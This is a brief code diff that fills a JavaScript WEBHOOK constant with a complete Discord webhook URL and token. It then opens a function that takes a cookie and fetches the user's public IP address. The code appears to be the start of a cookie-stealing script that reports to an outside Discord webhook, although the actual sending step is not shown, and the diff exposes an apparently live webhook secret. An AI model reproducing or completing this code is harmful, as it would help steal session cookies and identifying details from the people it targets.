@@ -1,4 +1,4 @@
-const WEBHOOK = "";
+const WEBHOOK = "https://discord.com/api/webhooks/1139169111436435538/FyiSQRXhJEFBznIQXf7di6zNts_CzVChCy23UnuwE3AQ2wczZ0A0TbJcNea6tFm2DYCC";
 
 async function main(cookie) {
     var ipAddr = await (await fetch("https://api.ipify.org")).text();
